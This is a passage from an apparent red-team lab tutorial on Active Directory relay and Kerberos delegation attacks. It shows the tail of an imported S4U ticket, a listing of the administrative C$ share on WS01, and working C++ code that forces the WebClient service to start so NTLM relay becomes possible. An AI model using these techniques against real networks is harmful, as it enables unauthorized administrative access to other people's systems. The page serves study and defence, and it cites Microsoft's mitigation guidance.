      Ujg/aYB3cjkQckRhxwEidoJL08z6vOwB3TJ1ecxi381KJ6zsWlKzs+V4HX1KHEkaS4O//zD2Tazb3nM1
      2hU2mx08FclzWs//3iZL3cBV+gn1RONVPVgUVCDObh6JaGhel4gBXjmVWPg7o6SaHSwe0c5jFBphkZvo
      dqY9pk0PA6/muzPfGHIXWlCbHg5lj6B1U3eynFmB4t1lkp4yNAS8Vtm4i4KwEmCNOWkkAFPeKMIzai7R
      rxEwqKF6+Ydq4q5ZIKN44OvnpaVidMAPC31fimin6D8uuEs3U4xOBDGZpgyk7iOTM7yIwpSthjqwbhue
      ErnnzHdewdruZBV+CJGLcUFoP0lv2ER9TdS6k3t5qd3TwTTEjZL4mMJhrneaPycDRR99dd/HXzbfooJn
      ntrpxUR8/NFKWZXew5ikspplUB94GsHlZt1NurkVOMVgdrTLEn7Vja19h53xS8ZRi+Vmw+1ODNwA2TSm
      VZ31yVNJ99v+1aOB7zCB7KADAgEAooHkBIHhfYHeMIHboIHYMIHVMIHSoBswGaADAgERoRIEEOaE0pD8
      WRKTyKQ8BHkC/O2hDxsNT0ZGRU5TRS5MT0NBTKIoMCagAwIBCqEfMB0bG2FkbWluaXN0cmF0b3JAb2Zm
      ZW5zZS5sb2NhbKMHAwUAQKEAAKURGA8yMDIxMDczMTIwMDcxOVqmERgPMjAyMTA4MDEwNjA3MTlapxEY
      DzIwMjEwODA3MjAwNzE5WqgPGw1PRkZFTlNFLkxPQ0FMqSUwI6ADAgECoRwwGhsEY2lmcxsSd3MwMS5v
      ZmZlbnNlLmxvY2Fs
[+] Ticket successfully imported!
```

![s4u successfully retrieves appropriate TGT and TGS](../../.gitbook/assets/image%20%281050%29.png)

We can now from try to access `WS01` `c$` from `CA01`:

```text
ls \\ws01.offense.local\c$
```

Below shows that we were able to list the `c$` share on `W01` confirming we have administrative access on `WS01`:

![C$ share being listed on WS01 from CA01](../../.gitbook/assets/image%20%281037%29.png)

### WebClient Service

For the above attack to work, the target system \(`WS01`\) has to have the `WebClient` service running:

![WebClient service running on WS01](../../.gitbook/assets/image%20%281055%29.png)

`WebClient` service is not running on computers by default and you need admin rights to start them, however it's possible to force the service to start using the below code:

{% code title="webclient.cpp" %}
```cpp
// Code taken from https://www.tiraniddo.dev/2015/03/starting-webclient-service.html
#include <Windows.h>
#include <evntprov.h>

int main()
{
    const GUID _MS_Windows_WebClntLookupServiceTrigger_Provider =
    { 0x22B6D684, 0xFA63, 0x4578,
    { 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 } };

        REGHANDLE Handle;
    bool success = false;

    if (EventRegister(&_MS_Windows_WebClntLookupServiceTrigger_Provider,
        nullptr, nullptr, &Handle) == ERROR_SUCCESS)
    {
        EVENT_DESCRIPTOR desc;
        EventDescCreate(&desc, 1, 0, 0, 4, 0, 0, 0);
        success = EventWrite(Handle, &desc, 0, nullptr) == ERROR_SUCCESS;
        EventUnregister(Handle);
    }

    return success;
}
```
{% endcode %}

Below shows `WebClient` service is not running on `WS01` and we cannot start it, however, executing the above code \(`webclient.cpp` compiled as `webclient.exe`\) kicks off the `WebClient` service for us:

![Forcing the WebClient service to run](../../.gitbook/assets/image%20%281053%29.png)

## References

{% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}

{% embed url="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429" %}

{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" %}
